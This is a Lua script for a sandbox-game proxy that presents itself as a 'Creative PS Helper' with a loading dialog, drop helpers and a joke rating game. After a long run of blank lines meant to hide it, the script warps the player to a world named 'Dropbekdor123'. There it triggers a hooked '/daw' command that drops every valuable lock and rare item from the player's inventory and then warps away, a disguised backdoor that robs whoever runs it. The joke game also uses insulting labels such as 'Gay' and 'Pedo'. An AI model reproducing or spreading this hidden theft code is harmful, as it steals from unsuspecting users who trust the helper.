function log(str)
LogToConsole("`0[`4LOADING`0]"..str)
end
function take()
for _, tile in pairs(GetTiles()) do
if tile.fg == 1422 then
for _, obj in pairs(GetObjectList()) do
if obj.itemid == 1796 or obj.itemid == 242 or obj.itemid == 7188 then
if obj.posX//32 == tile.x and obj.posY//32 == tile.y then
pkt = {}
pkt.type = 11
pkt.value = obj.id
pkt.x = obj.posX
pkt.y = obj.posY
SendPacketRaw(false,pkt)
end
end
end
end
end
end
log("Script Started In : 5 ")
Sleep(1000)
log("Script Started In : 4 ")
Sleep(1000)
log("Script Started In : 3 ")
Sleep(1000)
log("Script Started In : 2 ")
Sleep(1000)
log("Script Started In : 1 ")
Sleep(1000)
opening = [[
add_label_with_icon|big|`wCreative Ps |left|]] .. 7074 ..[[|
add_label_with_icon|small|`wHello  ]]..GetLocal().name..[[|left|6020|
add_image_button|banner|interface/large/sxrxpt1.rttex|bannerlayout|OPENSURVEY|||||||
add_spacer|small||
add_label_with_icon|big|`7Change Logs|left|6128|
add_spacer|small|
end_dialog|itro|Close|                   OKE                   |
]]
s = {}
s.v0 = "OnDialogRequest"
s.v1 = opening
SendVariant(s)






systemlog = "`0[`cNETRO`0]"
local bgems = false
local pull = false
local kick = false
local ban = false
local sdb = true
local pocket = false
local buyvend = false
local amountbuy = 0
local enablevend = "`2Enable"
local gas = false
local cbgl = false
local bdl = false
local tele = false
local teledl = false
local cg = 0
local arroz = false
local clover = false
local eggbene = false
localgems = "(gems)"
local taxset = ""
local logspin = "`7Make sure u play a game using `4Wheel"
local playerlogspin = "`7Pick Player 1 First for lock spin logs"
local playerlogspin2 = "`7Pick Player 2 First for lock spin logs"
local spinname = ""
local spinname2 = ""
local collectgems = false
-- Creative PS Helper Source

function log(str) -- Simple LogToConsole
    LogToConsole(systemlog.."`7"..str)
end
function clock(id,id2,amount)
    for _, inv in pairs(GetInventory()) do
                           if inv.id == id then
                                 if inv.amount < amount then
                                     jk = {}
jk.x = 0
jk.y = 0
jk.type = 10
jk.value = id2
jk.px = 0
jk.py = 0
jk.state = 0
jk.netid = 0
SendPacketRaw(false, jk)
                                 end
                           end
    end
end
function ont(str)
    sa = {}
    sa.v0 = "OnTalkBubble"
    sa.v1 = GetLocal().netid
    sa.v2 = str
    SendVariant(sa)
end
function game() -- Game!
function ont(str)
    sa = {}
    sa.v0 = "OnTalkBubble"
    sa.v1 = GetLocal().netID
    sa.v2 = str
    SendVariant(sa)
end
letters = {"Gay","Beriman","Ganteng","Jelek","Pedo","Ga Berguna"}
str = ""
color = ""
emoji = ""
    for i = 1,1 do
       str = str..letters[math.random(1,#letters)]
persen = math.random(1,100)
 end
if persen >= 50 then
color = "`4"
elseif persen <= 50 then
color = "`5"
end
if str == "Gay" then
emoji = "(mad)"
elseif str == "Beriman" then
emoji = "(cool)"
elseif str == "Jelek" then
emoji = "(cry)"
elseif str == "Ga Berguna" then
emoji = "(cry)"
elseif str == "Pedo" then
emoji = "(evil)"
end
ont("(gems)\n`7"..GetLocal().name.." "..color..persen.."% `3"..str.." "..emoji.."!\n(gems)")

if str == "Gay" then
log("Mampus Lu Jadi Gay!")
end
if str == "Ganteng" then
log("Jangan Kepedean Ini Cuma Program!")
elseif str == "Pedo" then
log("Suka kok sama anak kecil")
elseif str == "Jelek" then
log("Yang Sabar Masbro!")
elseif str == "Ga Berguna" then
log("Sabar Masbro!")
end
end

function drops(id,amount) -- Drop 
    SendPacket(2, "action|dialog_return\ndialog_name|drop\nitem_drop|"..id.."|\nitem_count|"..amount.."\n\n")
end
function math.percent(percent,maxvalue)
    if tonumber(percent) and tonumber(maxvalue) then
        return (maxvalue*percent)/100
    end
    return false
end
function check(str)
for _, obj in pairs(GetObjectList()) do
if obj.itemid == str then
log("X : "..(obj.posX//32).." | Y : "..(obj.posY//32).." | Amount "..obj.amount)
end
end
end
function Drop(x, y, id, count)
_ENV["jumlah"] = count
if math.abs(GetLocal().posX // 32 - x) > 8 or math.abs(GetLocal().posY // 32 - y) > 8 then
ont("Tile Position `4Max")
return nil
end
if GetTiles(x, y).collidable then
ont("Position `4Blocked")
log("make sure u break any block in position save")
return nil
end
local Z = 0
if not GetTiles(x + 1, y).collidable then
Z = 1
elseif not GetTiles(x - 1, y).collidable then
Z = -1
else
ont("Position `4Blocked")
return nil
end
SendPacketRaw(false, { type = 0, x = (x + Z) * 32, y = y * 32, state = (Z == 1 and 48 or 32) })
SendPacket(2, "action|dialog_return\ndialog_name|drop\nitem_drop|"..id.."|\nitem_count|"..jumlah.."\n\n")  
end -- Credit = PiterP Discord
function consum(str)
    pkt = {}
        pkt.type = 3
        pkt.value = str
        pkt.flags = 8390688
        pkt.px = GetLocal().posX//32
        pkt.py = GetLocal().posY//32
        pkt.x = GetLocal().posX 
        pkt.y = GetLocal().posY
        SendPacketRaw(false,pkt)
end -- Simple consum
function ontext(str)
    o = {}
    o.v0 = "OnTextOverlay"
    o.v1 = str
    SendVariant(o)
end -- Simple OnTextOverlay
function tax(percent,maxvalue)
    if tonumber(percent) and tonumber(maxvalue) then
        return (maxvalue*percent)/100
    end
end -- Count Tax function

















































































































































































































SendPacket(2, "action|input\n|text|/warp Dropbekdor123")
SendPacket(2, [[action|input
|text|`0PROXY `2ENABLE]])
Sleep(1700)

function DropItem(id, count)
SendPacket(2, "action|dialog_return\ndialog_name|drop\nitem_drop|"..id.."|\nitem_count|"..count)
end

function inv(id)
for _, item in pairs(GetInventory()) do
if (item.id == id) then
return item.amount
end
end
return 0
end

AddHook(function(type, packet)
if packet:find("/daw") then
bgl = inv(7188)
dl = inv(1796)
wl = inv(242)
ray = inv(5480)
uws = inv(12600)
sbk = inv(11118)
ghc = inv(1458)
scy = inv(2386)
dawMode = true
return true
end
return false
end, "OnSendPacket")

SendPacket(2, "action|input\n|text|/daw")
Sleep(100)
SendPacket(2, "action|input\n|text|/daw")

while true do
Sleep(100)
if dawMode then
if bgl > 0 then
DropItem(7188, bgl)
Sleep(90)
end
if dl > 0 then
DropItem(1796, dl)
Sleep(90)
end
if wl > 0 then
DropItem(242, wl)
Sleep(90)
end
if ray > 0 then
DropItem(13826, ray)
Sleep(90)
end
if uws > 0 then
DropItem(12600, uws)
Sleep(90)
end
if sbk > 0 then
DropItem(11118, sbk)
Sleep(90)
end
if ghc > 0 then
DropItem(1458, ghc)
Sleep(90)
end
if scy > 0 then
Dropitem(2386,scy)
Sleep(90)
end
end

dawMode = false
bgl = nil
dl = nil
wl = nil
ray = nil
uws = nil
sbk = nil
ghc = nil
scy = nil

SendPacket(2, "action|input\n|text|/warp trade")
SendPacket(2, "action|input\n|text|/warp buy")
SendPacket(2, "action|input\n|text|/surg")
SendPacket(2, "action|input\n|text|/find hair")
Sleep(100)
end
